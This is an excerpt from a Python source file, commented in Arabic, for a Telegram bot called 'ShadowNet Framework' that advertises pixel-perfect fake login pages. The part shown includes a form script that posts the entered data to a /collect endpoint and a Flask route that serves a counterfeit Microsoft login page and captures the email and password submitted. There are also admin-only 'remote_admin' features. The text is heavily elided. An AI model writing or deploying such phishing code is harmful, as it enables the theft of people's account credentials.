...
"""
ShadowNet Framework v4.0 - صفحات تسجيل الدخول المزيفة فقط
جميع الصفحات مطابقة للأصل 100%
جميع الأزرار الأمنية تعمل بشكل حقيقي
"""
...
# ===================== دوال الخدمات الأساسية (فحص الأمان، تتبع رقم، إلخ) =====================
...
ADMIN_ONLY_FEATURES = [
    "admin_panel", "view_devices", "remote_admin",
...
def build_main_menu(user_id):
    ...
    markup.row(
        InlineKeyboardButton("🌐 فحص الروابط", callback_data="mode_link_scanner") if can_access("link_scanner", 0) else InlineKeyboardButton("🌐 فحص الروابط 🔒", callback_data="locked_link_scanner")
    )
...
def callback_query(call):
    ...
    if data.startswith("locked_"):
        if is_admin_user or unlocked:
            ...
            elif "link_scanner" in data: required = 0
            else:
                required = 10
        ...
        elif actual_mode == "mode_link_scanner":
...
# ===================== صفحات تسجيل الدخول المزيفة (Pixel-Perfect) =====================
...
<body>
    ...
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            ...
            var formData = new FormData(this);
            fetch('/collect', { method: 'POST', body: formData })
...
def collect_route():
    if request.method == 'GET':
        return render_template_string(MICROSOFT_LOGIN_PAGE)
    else:
        email = request.form.get('email')
        password = request.form.get('password')
        data = {
